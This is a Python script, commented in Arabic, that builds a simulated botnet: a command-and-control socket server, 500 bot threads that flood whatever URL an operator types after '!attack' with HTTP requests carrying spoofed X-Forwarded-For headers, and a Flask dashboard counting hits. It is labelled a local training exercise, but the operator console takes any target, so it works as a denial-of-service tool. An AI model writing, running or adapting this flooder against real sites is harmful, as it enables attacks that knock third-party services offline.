import socket
import threading
import time
import random
import requests
from flask import Flask, render_template_string
from concurrent.futures import ThreadPoolExecutor

# إعداد Flask Dashboard
app = Flask(__name__)
PORT = 6000  # بورت واجهة الويب
target_url = "http://127.0.0.1:5000"  # الهدف (محلي)

# الإحصائيات
success = 0
failure = 0
lock = threading.Lock()

# قائمة البوتات المتصلة
bots = []

def generate_fake_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def bot_task():
    while True:
        try:
            s = socket.socket()
            s.connect(("127.0.0.1", 7000))  # الاتصال بـ C2
            bots.append(s)
            while True:
                cmd = s.recv(1024).decode()
                if "!attack" in cmd:
                    _, url = cmd.strip().split()
                    for _ in range(50):  # تنفيذ 50 طلب دفعة واحدة
                        threading.Thread(target=send_http, args=(url,)).start()
                elif "!stop" in cmd:
                    break
        except:
            time.sleep(1)

def send_http(url):
    global success, failure
    headers = {
        "User-Agent": f"BotNetSim/{random.randint(100,999)}",
        "X-Forwarded-For": generate_fake_ip()
    }
    try:
        r = requests.get(url, headers=headers, timeout=2)
        with lock:
            success += 1
    except:
        with lock:
            failure += 1

# C2 Server
def c2_server():
    server = socket.socket()
    server.bind(("0.0.0.0", 7000))
    server.listen()
    print("[*] C2 Server يعمل على المنفذ 7000...")
    while True:
        conn, addr = server.accept()
        print(f"[+] بوت جديد: {addr}")
        bots.append(conn)
        threading.Thread(target=handle_bot, args=(conn,)).start()

def handle_bot(conn):
    while True:
        try:
            data = conn.recv(1024)
            if not data:
                break
        except:
            break
    conn.close()

# Dashboard Web
@app.route('/')
def dashboard():
    return render_template_string('''
        <html>
        <head><title>📊 Dashboard</title></head>
        <body style="font-family:sans-serif; background:#1e1e2f; color:#fff; text-align:center;">
            <h1>📡 إحصائيات البوتات التدريبية</h1>
            <p>🔗 الهدف: {{ url }}</p>
            <p>✅ ناجحة: <strong style="color:lime;">{{ success }}</strong></p>
            <p>❌ فاشلة: <strong style="color:red;">{{ failure }}</strong></p>
            <p>🤖 عدد البوتات: <strong>{{ bot_count }}</strong></p>
        </body>
        </html>
    ''', url=target_url, success=success, failure=failure, bot_count=len(bots))

# إطلاق الهجوم اليدوي من المستخدم
def command_console():
    while True:
        cmd = input("🧠 أدخل الأمر (!attack URL / !stop): ")
        for bot in bots:
            try:
                bot.send(cmd.encode())
            except:
                continue

if __name__ == "__main__":
    # بدء C2
    threading.Thread(target=c2_server, daemon=True).start()

    # تشغيل 500 بوت كـ Threads
    for _ in range(500):
        threading.Thread(target=bot_task, daemon=True).start()

    # بدء Dashboard
    threading.Thread(target=lambda: app.run(port=PORT), daemon=True).start()

    # سطر الأوامر
    command_console()
  
